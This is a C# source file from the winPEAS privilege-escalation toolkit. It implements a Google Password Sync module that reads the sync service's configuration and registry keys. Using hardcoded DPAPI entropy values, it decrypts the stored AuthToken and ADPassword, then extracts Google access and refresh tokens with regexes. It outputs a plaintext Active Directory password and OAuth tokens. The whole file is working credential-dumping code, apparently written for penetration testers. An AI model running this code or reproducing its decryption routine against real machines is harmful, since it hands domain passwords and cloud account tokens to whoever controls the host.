using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using winPEAS.Helpers;
using System.Data.SQLite;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Modes;
using System.Linq;
using Microsoft.Win32;
using System.Web.Script.Serialization;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;


namespace winPEAS.Info.CloudInfo
{
    internal class GPSInfo : CloudInfoBase
    {
        public override string Name => "Google Password Sync";

        public override bool IsCloud => CheckIfGPSInstalled();

        private Dictionary<string, List<EndpointData>> _endpointData = null;

        public static bool CheckIfGPSInstalled()
        {
            string[] check = Helpers.Registry.RegistryHelper.ListRegValues("HKLM", @"SOFTWARE\Google\Google Apps Password Sync");
            bool regExists = check != null && check.Length > 0;
            bool result = regExists || File.Exists(@"C:\Program Files\Google\Password Sync\PasswordSync.exe") || File.Exists(@"C:\Program Files\Google\Password Sync\password_sync_service.exe");
            return result;
        }

        private List<EndpointData> GetGPSValues()
        {
            Dictionary<string, string> GPSRegValues = new Dictionary<string, string>();

            // Check config file
            string path_config = @"C:\ProgramData\Google\Google Apps Password Sync\config.xml";
            if (File.Exists(path_config))
            {
                try
                {
                    // Load the XML file
                    string xmlContent = File.ReadAllText(path_config);

                    // Extract values using Regex
                    string baseDN = ExtractValue(xmlContent, @"<baseDN>(.*?)<\/baseDN>");
                    string authorizedUsername = ExtractValue(xmlContent, @"<authorizedUsername>(.*?)<\/authorizedUsername>");
                    string anonymousAccess = ExtractValue(xmlContent, @"<useAnonymousAccess value=""(.*?)"" ");

                    // Output the extracted values
                    GPSRegValues.Add("BaseDN", baseDN);
                    GPSRegValues.Add("AnonymousAccess", anonymousAccess);
                    GPSRegValues.Add("authorizedUsername", authorizedUsername);
                }
                catch (Exception ex)
                {
                    Beaprint.PrintException("Error accessing the Google Password Sync configuration from 'C:\\ProgramData\\Google\\Google Apps Password Sync\\config.xml'");
                    Beaprint.PrintException("Exception: " + ex.Message);
                }
            }

            // Get registry valus and decrypt them
            string hive = "HKLM";
            string regAddr = @"SOFTWARE\Google\Google Apps Password Sync";
            string[] subkeys = Helpers.Registry.RegistryHelper.ListRegValues(hive, regAddr);
            if (subkeys == null || subkeys.Length == 0)
            {
                Beaprint.PrintException("WinPEAS need admin privs to check the registry for credentials");
            }
            else
            {
                GPSRegValues.Add("Email", Helpers.Registry.RegistryHelper.GetRegValue(hive, regAddr, @"Email"));

                // Remove "Email" and "address" from the array
                string[] filteredSubkeys = subkeys
                    .Where(key => key != "Email" && key != "AuthToken" && key != "ADPassword" && key != "(Default)")
                    .ToArray();

                // Check if there are any subkeys left after filtering
                if (filteredSubkeys.Length > 1)
                {
                    // Join the remaining subkeys with ", " and print to the console
                    GPSRegValues.Add("Other keys", string.Join(", ", filteredSubkeys) + " (might contain credentials but WinPEAS doesn't support them)");
                }
                else
                {
                    Console.WriteLine("No subkeys left after filtering.");
                }


                // Check if AuthToken in the registry
                string authtokenInReg = Helpers.Registry.RegistryHelper.GetRegValue(hive, regAddr, @"AuthToken");
                if (authtokenInReg.Length > 0)
                {
                    try
                    {
                        Native.Advapi32 advapi = new Native.Advapi32();
                        byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };

                        // Decrypt auth token
                        byte[] encryptedEncodedAuthToken = advapi.ReadRegistryValue(regAddr, @"AuthToken");
                        byte[] decryptedData = DecryptData(encryptedEncodedAuthToken, entropyBytes);
                        string base32hexEncodedString = Encoding.Unicode.GetString(decryptedData).TrimEnd('\0');

                        // Decode decrypted auth token
                        byte[] originalData = Base32HexDecoder.Decode(base32hexEncodedString);
                        string plainAuthToken = Encoding.Unicode.GetString(originalData).TrimEnd('\0');

                        // Find tokens via regexes
                        string accessTokenRegex = @"ya29\.[a-zA-Z0-9_\-]{50,}";
                        string refreshTokenRegex = @"1//[a-zA-Z0-9_\-]{50,}";

                        MatchCollection accesTokens = Regex.Matches(plainAuthToken, accessTokenRegex);
                        MatchCollection refreshTokens = Regex.Matches(plainAuthToken, refreshTokenRegex);

                        if (refreshTokens.Count > 0)
                        {
                            GPSRegValues.Add("Decrypted refresh token", refreshTokens[0].Value);
                        }

                        if (accesTokens.Count > 0)
                        {
                            GPSRegValues.Add("Decrypted access token", accesTokens[0].Value);
                        }
                    }
                    catch (Exception ex)
                    {
                        Beaprint.PrintException("Error trying to decrypt and decode the AuthToken. You will need to check it yourself. It's in " + hive + "\\" + regAddr + " (key: AuthToken)\nError was: " + ex.Message);
                        GPSRegValues.Add("authToken (error)", "Error trying to decrypt and decode the AuthToken. You will need to check it yourself. It's in " + hive + "\\" + regAddr);
                    }
                }

                string adpasswordInReg = Helpers.Registry.RegistryHelper.GetRegValue(hive, regAddr, @"ADPassword");
                if (adpasswordInReg.Length > 0)
                {
                    try
                    {
                        Native.Advapi32 advapi = new Native.Advapi32();
                        byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };


                        // Decrypt auth token
                        byte[] encryptedEncodedAuthToken = advapi.ReadRegistryValue(regAddr, @"ADPassword");
                        byte[] decryptedData = DecryptData(encryptedEncodedAuthToken, entropyBytes);
                        string plainPasswd = Encoding.Unicode.GetString(decryptedData).TrimEnd('\0');
                        GPSRegValues.Add("ADPassword decrypted", plainPasswd);
                    }
                    catch (Exception ex)
                    {
                        Beaprint.PrintException("Error trying to decrypt and decode the ADPassword. You will need to check it yourself. It's in " + hive + "\\" + regAddr + " (key: ADPassword)\nError was: " + ex.Message);
                        GPSRegValues.Add("ADPassword (error)", "Error trying to decrypt and decode the AuthToken. You will need to check it yourself. It's in " + hive + "\\" + regAddr);
                    }
                }
            }

            // Format the info in expected CloudInfo format
            List <EndpointData> _endpointDataList = new List<EndpointData>();

            foreach (var kvp in GPSRegValues)
            {
                _endpointDataList.Add(new EndpointData()
                {
                    EndpointName = kvp.Key,
                    Data = kvp.Value?.Trim(),
                    IsAttackVector = false
                });
            }

            return _endpointDataList;
        }

        public string ExtractValue(string input, string pattern)
        {
            Match match = Regex.Match(input, pattern);
            if (match.Success)
            {
                return match.Groups[1].Value;
            }
            return "Not found";
        }


        public override Dictionary<string, List<EndpointData>> EndpointDataList()
        {
            if (_endpointData == null)
            {
                _endpointData = new Dictionary<string, List<EndpointData>>();

                try
                {
                    if (IsAvailable)
                    {
                        _endpointData.Add("Local Info", GetGPSValues());
                    }
                    else
                    {
                        _endpointData.Add("General Info", new List<EndpointData>()
                        {
                            new EndpointData()
                            {
                                EndpointName = "",
                                Data = null,
                                IsAttackVector = false
                            }
                        });
                    }
                }
                catch (Exception ex)
                {
                    Beaprint.PrintException(ex.Message);
                }
            }

            return _endpointData;
        }

        public override bool TestConnection()
        {
            return true;
        }

        public byte[] DecryptData(byte[] encryptedData, byte[] entropyBytes)
        {
            Native.Crypt32.DATA_BLOB dataIn = new Native.Crypt32.DATA_BLOB();
            Native.Crypt32.DATA_BLOB dataOut = new Native.Crypt32.DATA_BLOB();
            Native.Crypt32.DATA_BLOB optionalEntropy = new Native.Crypt32.DATA_BLOB();

            try
            {
                // Prepare the DATA_BLOB for input data
                dataIn.pbData = Marshal.AllocHGlobal(encryptedData.Length);
                dataIn.cbData = encryptedData.Length;
                Marshal.Copy(encryptedData, 0, dataIn.pbData, encryptedData.Length);

                // Initialize output DATA_BLOB
                dataOut.pbData = IntPtr.Zero;
                dataOut.cbData = 0;

                // Prepare the DATA_BLOB for optional entropy
                optionalEntropy.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
                optionalEntropy.cbData = entropyBytes.Length;
                Marshal.Copy(entropyBytes, 0, optionalEntropy.pbData, entropyBytes.Length);

                // Call CryptUnprotectData with optional entropy
                bool success = Native.Crypt32.CryptUnprotectData(
                    ref dataIn,
                    null,
                    ref optionalEntropy,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    0,
                    ref dataOut);

                if (!success)
                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
                // Copy decrypted data to a byte array
                byte[] decryptedData = new byte[dataOut.cbData + 2];
                Marshal.Copy(dataOut.pbData, decryptedData, 0, dataOut.cbData);

                return decryptedData;
            }
            finally
            {
                // Free allocated memory
                if (dataIn.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(dataIn.pbData);
                if (dataOut.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(dataOut.pbData);
                if (optionalEntropy.pbData != IntPtr.Zero)
                    Marshal.FreeHGlobal(optionalEntropy.pbData);
            }
        }
    }
}




public static class Base32HexDecoder
{
    private static readonly char[] Alphabet = "0123456789abcdefghijklmnopqrstuv".ToCharArray();
    private static readonly Dictionary<char, int> CharMap = new Dictionary<char, int>();

    static Base32HexDecoder()
    {
        for (int i = 0; i < Alphabet.Length; i++)
        {
            CharMap[Alphabet[i]] = i;
        }
    }

    public static byte[] Decode(string input)
    {
        input = input.ToLowerInvariant();
        List<byte> bytes = new List<byte>();

        int buffer = 0;
        int bitsLeft = 0;

        foreach (char c in input)
        {
            if (!CharMap.ContainsKey(c))
                throw new ArgumentException("Invalid character in base32hex string.");

            buffer = (buffer << 5) | CharMap[c];
            bitsLeft += 5;

            if (bitsLeft >= 8)
            {
                bitsLeft -= 8;
                bytes.Add((byte)((buffer >> bitsLeft) & 0xFF));
            }
        }

        return bytes.ToArray();
    }
}